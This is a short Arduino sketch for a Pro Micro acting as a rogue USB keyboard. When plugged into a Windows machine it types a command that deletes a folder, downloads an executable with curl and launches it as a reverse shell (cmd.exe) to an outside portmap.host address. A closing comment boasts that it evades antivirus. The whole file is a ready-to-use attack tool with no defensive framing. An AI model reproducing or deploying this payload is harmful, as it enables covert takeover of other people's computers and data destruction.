#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  Keyboard.begin();
  delay(1500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("cmd /c cd / & rmdir /s /q win & mkdir win & cd win & curl https://file.io/abcdxyz -o syscl.exe & START /MIN syscl.exe [PORTMAP_ID].portmap.host port -e cmd.exe -d & exit");
  typeKey(KEY_RETURN);
  Keyboard.end();
}
void loop() {}

//pro micro reverse shell, not detected by antiviruses
